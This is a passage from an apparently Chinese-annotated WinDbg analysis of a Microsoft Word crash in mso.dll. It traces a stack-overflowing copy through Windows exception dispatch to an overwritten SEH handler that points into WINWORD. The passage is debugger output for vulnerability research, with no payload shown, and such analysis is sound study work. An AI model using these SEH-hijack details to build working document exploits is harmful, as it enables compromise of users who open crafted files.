class="number">0x1f</span></span><br><span class="line"> <span class="number">5</span> e 7c9232a6     <span class="number">0001</span> (<span class="number">0001</span>)  <span class="number">0</span>:**** ntdll!ExecuteHandler2+<span class="number">0x24</span></span><br><span class="line"> <span class="number">6</span> e 30001bdd     <span class="number">0001</span> (<span class="number">0001</span>)  <span class="number">0</span>:**** WINWORD+<span class="number">0x1bdd</span></span><br><span class="line"><span class="number">0</span>:<span class="number">007</span>&gt; g</span><br><span class="line"><span class="symbol">ModLoad:</span> 5fdd0000 5fe25000   C:\WINDOWS\system32\netapi32.dll</span><br><span class="line"><span class="symbol">ModLoad:</span> 75c60000 75d00000   C:\WINDOWS\system32\urlmon.dll</span><br><span class="line"><span class="symbol">ModLoad:</span> 76d70000 76d92000   C:\WINDOWS\system32\Apphelp.dll</span><br><span class="line"><span class="symbol">ModLoad:</span> <span class="number">06860000</span> 06a01000   C:\Program Files\Microsoft Office\OFFICE11\GdiPlus.DLL</span><br><span class="line"><span class="symbol">ModLoad:</span> 76f20000 76f28000   C:\WINDOWS\system32\WTSAPI32.DLL</span><br><span class="line"><span class="symbol">ModLoad:</span> 762d0000 762e0000   C:\WINDOWS\system32\WINSTA.dll</span><br><span class="line">(<span class="number">140.e28</span>): Access violation - code c0000005 (first chance)</span><br><span class="line">First chance exceptions are reported before any exception handling.</span><br><span class="line">This exception may be expected <span class="keyword">and</span> handled.</span><br><span class="line"><span class="built_in">eax</span>=0000c8ac <span class="built_in">ebx</span>=<span class="number">05000000</span> <span class="built_in">ecx</span>=<span class="number">00000022</span> <span class="built_in">edx</span>=<span class="number">00000000</span> <span class="built_in">esi</span>=1104c830 <span class="built_in">edi</span>=<span class="number">00130000</span></span><br><span class="line"><span class="built_in">eip</span>=30ed442c <span class="built_in">esp</span>=001237b4 <span class="built_in">ebp</span>=001237ec iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00010206</span></span><br><span class="line">*** ERROR: Symbol file could <span class="keyword">not</span> be found.  Defaulted to export symbols for C:\Program Files\<span class="meta">Common</span> Files\Microsoft Shared\office11\mso.dll - </span><br><span class="line">mso!Ordinal1246+<span class="number">0x16b0</span>:</span><br><span class="line">30ed442c f3a5            <span class="keyword">rep</span> movs <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">es</span>:[<span class="built_in">edi</span>],<span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>] &lt;----发生异常</span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; gn</span><br><span class="line">Breakpoint <span class="number">0</span> hit</span><br><span class="line"><span class="built_in">eax</span>=0000c8ac <span class="built_in">ebx</span>=<span class="number">05000000</span> <span class="built_in">ecx</span>=<span class="number">00000022</span> <span class="built_in">edx</span>=<span class="number">00000000</span> <span class="built_in">esi</span>=1104c830 <span class="built_in">edi</span>=<span class="number">00130000</span></span><br><span class="line"><span class="built_in">eip</span>=7c92e45c <span class="built_in">esp</span>=001234c4 <span class="built_in">ebp</span>=001237ec iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000206</span></span><br><span class="line">ntdll!KiUserExceptionDispatcher:</span><br><span class="line">7c92e45c 8b4c2404        <span class="keyword">mov</span>     <span class="built_in">ecx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">esp</span>+<span class="number">4</span>] <span class="built_in">ss</span>:<span class="number">0023</span>:001234c8=001234e8</span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; <span class="built_in">dd</span> <span class="built_in">esp</span></span><br><span class="line">001234c4  001234cc 001234e8 c0000005 <span class="number">00000000</span></span><br><span class="line">001234d4  <span class="number">00000000</span> 30ed442c <span class="number">00000002</span> <span class="number">00000001</span></span><br><span class="line">001234e4  <span class="number">00130000</span> 0001003f <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">001234f4  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">00123504</span>  ffff037f ffff0000 ffffffff 30d582a7</span><br><span class="line"><span class="number">00123514</span>  <span class="number">00000000</span> <span class="number">00000000</span> ffff0000 ff354963</span><br><span class="line"><span class="number">00123524</span>  <span class="number">00000000</span> 4963ffff 0000ff35 ffff0000</span><br><span class="line"><span class="number">00123534</span>  <span class="number">00000000</span> <span class="number">00000000</span> 0000ffff <span class="number">00000000</span></span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; <span class="built_in">dt</span> _EXCEPTION_RECORD 001234cc</span><br><span class="line">ntdll!_EXCEPTION_RECORD</span><br><span class="line">   +<span class="number">0x000</span> ExceptionCode    : 0n-<span class="number">1073741819</span> &lt;---- <span class="number">16</span>进制补码(C0000005),EXCEPTION_INVALID_VIOLATION,读写内存违规</span><br><span class="line">   +<span class="number">0x004</span> ExceptionFlags   : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x008</span> ExceptionRecord  : (null) </span><br><span class="line">   +<span class="number">0x00c</span> ExceptionAddress : <span class="number">0x30ed442c</span> Void &lt;---- 发生异常的指令地址</span><br><span class="line">   +<span class="number">0x010</span> NumberParameters : <span class="number">2</span></span><br><span class="line">   +<span class="number">0x014</span> ExceptionInformation : [<span class="number">15</span>] <span class="number">1</span></span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; <span class="built_in">dt</span> _CONTEXT 001234e8 </span><br><span class="line">ntdll!_CONTEXT</span><br><span class="line">   +<span class="number">0x000</span> ContextFlags     : <span class="number">0x1003f</span></span><br><span class="line">   +<span class="number">0x004</span> <span class="built_in">Dr0</span>              : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x008</span> <span class="built_in">Dr1</span>              : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x00c</span> <span class="built_in">Dr2</span>              : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x010</span> <span class="built_in">Dr3</span>              : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x014</span> Dr6              : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x018</span> Dr7              : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x01c</span> FloatSave        : _FLOATING_SAVE_AREA</span><br><span class="line">   +<span class="number">0x08c</span> SegGs            : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x090</span> SegFs            : <span class="number">0x3b</span></span><br><span class="line">   +<span class="number">0x094</span> SegEs            : <span class="number">0x23</span></span><br><span class="line">   +<span class="number">0x098</span> SegDs            : <span class="number">0x23</span></span><br><span class="line">   +<span class="number">0x09c</span> <span class="built_in">Edi</span>              : <span class="number">0x130000</span></span><br><span class="line">   +<span class="number">0x0a0</span> <span class="built_in">Esi</span>              : <span class="number">0x1104c830</span></span><br><span class="line">   +<span class="number">0x0a4</span> <span class="built_in">Ebx</span>              : <span class="number">0x5000000</span></span><br><span class="line">   +<span class="number">0x0a8</span> <span class="built_in">Edx</span>              : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x0ac</span> <span class="built_in">Ecx</span>              : <span class="number">0x22</span></span><br><span class="line">   +<span class="number">0x0b0</span> <span class="built_in">Eax</span>              : <span class="number">0xc8ac</span></span><br><span class="line">   +<span class="number">0x0b4</span> <span class="built_in">Ebp</span>              : <span class="number">0x1237ec</span></span><br><span class="line">   +<span class="number">0x0b8</span> <span class="built_in">Eip</span>              : <span class="number">0x30ed442c</span></span><br><span class="line">   +<span class="number">0x0bc</span> SegCs            : <span class="number">0x1b</span></span><br><span class="line">   +<span class="number">0x0c0</span> EFlags           : <span class="number">0x10206</span></span><br><span class="line">   +<span class="number">0x0c4</span> <span class="built_in">Esp</span>              : <span class="number">0x1237b4</span></span><br><span class="line">   +<span class="number">0x0c8</span> SegSs            : <span class="number">0x23</span></span><br><span class="line">   +<span class="number">0x0cc</span> ExtendedRegisters : [<span class="number">512</span>]  <span class="string">"???"</span></span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; g</span><br><span class="line">Breakpoint <span class="number">1</span> hit</span><br><span class="line"><span class="built_in">eax</span>=0000c8ac <span class="built_in">ebx</span>=001234cc <span class="built_in">ecx</span>=001234e8 <span class="built_in">edx</span>=<span class="number">00000000</span> <span class="built_in">esi</span>=1104c830 <span class="built_in">edi</span>=<span class="number">00130000</span></span><br><span class="line"><span class="built_in">eip</span>=7c92e465 <span class="built_in">esp</span>=001234bc <span class="built_in">ebp</span>=001237ec iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000206</span></span><br><span class="line">ntdll!KiUserExceptionDispatcher+<span class="number">0x9</span>:</span><br><span class="line">7c92e465 e8e6c40100      <span class="keyword">call</span>    ntdll!RtlDispatchException (7c94a950)</span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; <span class="built_in">dd</span> <span class="built_in">esp</span></span><br><span class="line">001234bc  001234cc 001234e8 001234cc 001234e8</span><br><span class="line">001234cc  c0000005 <span class="number">00000000</span> <span class="number">00000000</span> 30ed442c</span><br><span class="line">001234dc  <span class="number">00000002</span> <span class="number">00000001</span> <span class="number">00130000</span> 0001003f</span><br><span class="line">001234ec  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">001234fc  <span class="number">00000000</span> <span class="number">00000000</span> ffff037f ffff0000</span><br><span class="line">0012350c  ffffffff 30d582a7 <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">0012351c  ffff0000 ff354963 <span class="number">00000000</span> 4963ffff</span><br><span class="line">0012352c  0000ff35 ffff0000 <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; t</span><br><span class="line"><span class="built_in">eax</span>=0000c8ac <span class="built_in">ebx</span>=001234cc <span class="built_in">ecx</span>=001234e8 <span class="built_in">edx</span>=<span class="number">00000000</span> <span class="built_in">esi</span>=1104c830 <span class="built_in">edi</span>=<span class="number">00130000</span></span><br><span class="line"><span class="built_in">eip</span>=7c94a950 <span class="built_in">esp</span>=001234b8 <span class="built_in">ebp</span>=001237ec iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000206</span></span><br><span class="line">ntdll!RtlDispatchException:</span><br><span class="line">7c94a950 8bff            <span class="keyword">mov</span>     <span class="built_in">edi</span>,<span class="built_in">edi</span></span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; g</span><br><span class="line">Breakpoint <span class="number">2</span> hit</span><br><span class="line"><span class="built_in">eax</span>=001234a0 <span class="built_in">ebx</span>=0012ffb0 <span class="built_in">ecx</span>=0000e085 <span class="built_in">edx</span>=7c92e4f4 <span class="built_in">esi</span>=001234cc <span class="built_in">edi</span>=<span class="number">00130000</span></span><br><span class="line"><span class="built_in">eip</span>=7c94a9ea <span class="built_in">esp</span>=<span class="number">00123430</span> <span class="built_in">ebp</span>=001234b4 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">ntdll!RtlDispatchException+<span class="number">0xac</span>:</span><br><span class="line">7c94a9ea e85888fdff      <span class="keyword">call</span>    ntdll!RtlpExecuteHandlerForException (7c923247)</span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; <span class="built_in">dd</span> <span class="built_in">esp</span></span><br><span class="line"><span class="number">00123430</span>  001234cc 0012ffb0 001234e8 001234a0</span><br><span class="line"><span class="number">00123440</span>  30001bdd <span class="number">00130000</span> 001234cc 1104c830</span><br><span class="line"><span class="number">00123450</span>  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">00123460</span>  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">00123470</span>  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">00123480</span>  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">00123490</span>  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">001234a0  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00130000</span> <span class="number">00119000</span></span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; <span class="built_in">dt</span> _EXCEPTION_RECORD 001234cc</span><br><span class="line">ntdll!_EXCEPTION_RECORD</span><br><span class="line">   +<span class="number">0x000</span> ExceptionCode    : 0n-<span class="number">1073741819</span> &lt;---- <span class="number">16</span>进制补码(C0000005),EXCEPTION_INVALID_VIOLATION,读写内存违规</span><br><span class="line">   +<span class="number">0x004</span> ExceptionFlags   : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x008</span> ExceptionRecord  : (null) </span><br><span class="line">   +<span class="number">0x00c</span> ExceptionAddress : <span class="number">0x30ed442c</span> Void &lt;---- 发生异常的指令地址</span><br><span class="line">   +<span class="number">0x010</span> NumberParameters : <span class="number">2</span></span><br><span class="line">   +<span class="number">0x014</span> ExceptionInformation : [<span class="number">15</span>] <span class="number">1</span></span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; <span class="built_in">dt</span> _EXCEPTION_REGISTRATION_RECORD 0012ffb0 </span><br><span class="line">ntdll!_EXCEPTION_REGISTRATION_RECORD</span><br><span class="line">   +<span class="number">0x000</span> Next             : <span class="number">0xa29706eb</span> _EXCEPTION_REGISTRATION_RECORD</span><br><span class="line">   +<span class="number">0x004</span> Handler          : <span class="number">0x30001bdd</span>     _EXCEPTION_DISPOSITION  +<span class="number">0</span></span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; <span class="built_in">dt</span> _CONTEXT 001234e8 </span><br><span class="line">ntdll!_CONTEXT</span><br><span class="line">   +<span class="number">0x000</span> ContextFlags     : <span class="number">0x1003f</span></span><br><span class="line">   +<span class="number">0x004</span> <span class="built_in">Dr0</span>              : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x008</span> <span class="built_in">Dr1</span>              : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x00c</span> <span class="built_in">Dr2</span>              : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x010</span> <span class="built_in">Dr3</span>              : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x014</span> Dr6              : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x018</span> Dr7              : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x01c</span> FloatSave        : _FLOATING_SAVE_AREA</span><br><span class="line">   +<span class="number">0x08c</span> SegGs            : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x090</span> SegFs            : <span class="number">0x3b</span></span><br><span class="line">   +<span class="number">0x094</span> SegEs            : <span class="number">0x23</span></span><br><span class="line">   +<span class="number">0x098</span> SegDs            : <span class="number">0x23</span></span><br><span class="line">   +<span class="number">0x09c</span> <span class="built_in">Edi</span>              : <span class="number">0x130000</span></span><br><span class="line">   +<span class="number">0x0a0</span> <span class="built_in">Esi</span>              : <span class="number">0x1104c830</span></span><br><span class="line">   +<span class="number">0x0a4</span> <span class="built_in">Ebx</span>              : <span class="number">0x5000000</span></span><br><span class="line">   +<span class="number">0x0a8</span> <span class="built_in">Edx</span>              : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x0ac</span> <span class="built_in">Ecx</span>              : <span class="number">0x22</span></span><br><span class="line">   +<span class="number">0x0b0</span> <span class="built_in">Eax</span>              : <span class="number">0xc8ac</span></span><br><span class="line">   +<span class="number">0x0b4</span> <span class="built_in">Ebp</span>              : <span class="number">0x1237ec</span></span><br><span class="line">   +<span class="number">0x0b8</span> <span class="built_in">Eip</span>              : <span class="number">0x30ed442c</span></span><br><span class="line">   +<span class="number">0x0bc</span> SegCs            : <span class="number">0x1b</span></span><br><span class="line">   +<span class="number">0x0c0</span> EFlags           : <span class="number">0x10206</span></span><br><span class="line">   +<span class="number">0x0c4</span> <span class="built_in">Esp</span>              : <span class="number">0x1237b4</span></span><br><span class="line">   +<span class="number">0x0c8</span> SegSs            : <span class="number">0x23</span></span><br><span class="line">   +<span class="number">0x0cc</span> ExtendedRegisters : [<span class="number">512</span>]  <span class="string">"???"</span></span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; <span class="built_in">dd</span> 001234a0</span><br><span class="line">001234a0  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00130000</span> <span class="number">00119000</span></span><br><span class="line">001234b0  <span class="number">00000000</span> 001237ec 7c92e46a <span class="number">00000000</span></span><br><span class="line">001234c0  001234e8 001234cc 001234e8 c0000005</span><br><span class="line">001234d0  <span class="number">00000000</span> <span class="number">00000000</span> 30ed442c <span class="number">00000002</span></span><br><span class="line">001234e0  <span class="number">00000001</span> <span class="number">00130000</span> 0001003f <span class="number">00000000</span></span><br><span class="line">001234f0  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">00123500</span>  <span class="number">00000000</span> ffff037f ffff0000 ffffffff</span><br><span class="line"><span class="number">00123510</span>  30d582a7 <span class="number">00000000</span> <span class="number">00000000</span> ffff0000</span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; t</span><br><span class="line"><span class="built_in">eax</span>=001234a0 <span class="built_in">ebx</span>=0012ffb0 <span class="built_in">ecx</span>=0000e085 <span class="built_in">edx</span>=7c92e4f4 <span class="built_in">esi</span>=001234cc <span class="built_in">edi</span>=<span class="number">00130000</span></span><br><span class="line"><span class="built_in">eip</span>=7c923247 <span class="built_in">esp</span>=0012342c <span class="built_in">ebp</span>=001234b4 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">ntdll!RtlpExecuteHandlerForException:</span><br><span class="line">7c923247 babc32927c      <span class="keyword">mov</span>     <span class="built_in">edx</span>,offset ntdll!ExecuteHandler2+<span class="number">0x3a</span> (7c9232bc) &lt;---- ExecuteHandler2中安装的SEH记录的回调函数地址</span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=001234a0 <span class="built_in">ebx</span>=0012ffb0 <span class="built_in">ecx</span>=0000e085 <span class="built_in">edx</span>=7c9232bc <span class="built_in">esi</span>=001234cc <span class="built_in">edi</span>=<span class="number">00130000</span></span><br><span class="line"><span class="built_in">eip</span>=7c92324c <span class="built_in">esp</span>=0012342c <span class="built_in">ebp</span>=001234b4 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">ntdll!RtlpExecuteHandlerForException+<span class="number">0x5</span>:</span><br><span class="line">7c92324c eb08            <span class="keyword">jmp</span>     ntdll!ExecuteHandler (7c923256)</span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; p</span><br><span class="line">Breakpoint <span class="number">3</span> hit</span><br><span class="line"><span class="built_in">eax</span>=001234a0 <span class="built_in">ebx</span>=0012ffb0 <span class="built_in">ecx</span>=0000e085 <span class="built_in">edx</span>=7c9232bc <span class="built_in">esi</span>=001234cc <span class="built_in">edi</span>=<span class="number">00130000</span></span><br><span class="line"><span class="built_in">eip</span>=7c923256 <span class="built_in">esp</span>=0012342c <span class="built_in">ebp</span>=001234b4 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">ntdll!ExecuteHandler:</span><br><span class="line">7c923256 <span class="number">53</span>              <span class="keyword">push</span>    <span class="built_in">ebx</span></span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; <span class="built_in">dd</span> <span class="built_in">esp</span></span><br><span class="line">0012342c  7c94a9ef 001234cc 0012ffb0 001234e8</span><br><span class="line">0012343c  001234a0 30001bdd <span class="number">00130000</span> 001234cc</span><br><span class="line">0012344c  1104c830 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">0012345c  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">0012346c  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">0012347c  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">0012348c  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">0012349c  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00130000</span></span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=001234a0 <span class="built_in">ebx</span>=0012ffb0 <span class="built_in">ecx</span>=0000e085 <span class="built_in">edx</span>=7c9232bc <span class="built_in">esi</span>=001234cc <span class="built_in">edi</span>=<span class="number">00130000</span></span><br><span class="line"><span class="built_in">eip</span>=7c923257 <span class="built_in">esp</span>=<span class="number">00123428</span> <span class="built_in">ebp</span>=001234b4 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">ntdll!ExecuteHandler+<span class="number">0x1</span>:</span><br><span class="line">7c923257 <span class="number">56</span>              <span class="keyword">push</span>    <span class="built_in">esi</span></span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=001234a0 <span class="built_in">ebx</span>=0012ffb0 <span class="built_in">ecx</span>=0000e085 <span class="built_in">edx</span>=7c9232bc <span class="built_in">esi</span>=001234cc <span class="built_in">edi</span>=<span class="number">00130000</span></span><br><span class="line"><span class="built_in">eip</span>=7c923258 <span class="built_in">esp</span>=<span class="number">00123424</span> <span class="built_in">ebp</span>=001234b4 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">ntdll!ExecuteHandler+<span class="number">0x2</span>:</span><br><span class="line">7c923258 <span class="number">57</span>              <span class="keyword">push</span>    <span class="built_in">edi</span></span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=001234a0 <span class="built_in">ebx</span>=0012ffb0 <span class="built_in">ecx</span>=0000e085 <span class="built_in">edx</span>=7c9232bc <span class="built_in">esi</span>=001234cc <span class="built_in">edi</span>=<span class="number">00130000</span></span><br><span class="line"><span class="built_in">eip</span>=7c923259 <span class="built_in">esp</span>=<span class="number">00123420</span> <span class="built_in">ebp</span>=001234b4 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">ntdll!ExecuteHandler+<span class="number">0x3</span>:</span><br><span class="line">7c923259 33c0            <span class="keyword">xor</span>     <span class="built_in">eax</span>,<span class="built_in">eax</span></span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; <span class="built_in">dd</span> <span class="built_in">esp</span></span><br><span class="line"><span class="number">00123420</span>  <span class="number">00130000</span> 001234cc 0012ffb0 7c94a9ef</span><br><span class="line"><span class="number">00123430</span>  001234cc 0012ffb0 001234e8 001234a0</span><br><span class="line"><span class="number">00123440</span>  30001bdd <span class="number">00130000</span> 001234cc 1104c830</span><br><span class="line"><span class="number">00123450</span>  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">00123460</span>  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">00123470</span>  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">00123480</span>  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">00123490</span>  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=0012ffb0 <span class="built_in">ecx</span>=0000e085 <span class="built_in">edx</span>=7c9232bc <span class="built_in">esi</span>=001234cc <span class="built_in">edi</span>=<span class="number">00130000</span></span><br><span class="line"><span class="built_in">eip</span>=7c92325b <span class="built_in">esp</span>=<span class="number">00123420</span> <span class="built_in">ebp</span>=001234b4 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">ntdll!ExecuteHandler+<span class="number">0x5</span>:</span><br><span class="line">7c92325b 33<span class="built_in">db</span>            <span class="keyword">xor</span>     <span class="built_in">ebx</span>,<span class="built_in">ebx</span></span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; </span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=<span class="number">00000000</span> <span class="built_in">ecx</span>=0000e085 <span class="built_in">edx</span>=7c9232bc <span class="built_in">esi</span>=001234cc <span class="built_in">edi</span>=<span class="number">00130000</span></span><br><span class="line"><span class="built_in">eip</span>=7c92325d <span class="built_in">esp</span>=<span class="number">00123420</span> <span class="built_in">ebp</span>=001234b4 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">ntdll!ExecuteHandler+<span class="number">0x7</span>:</span><br><span class="line">7c92325d 33f6            <span class="keyword">xor</span>     <span 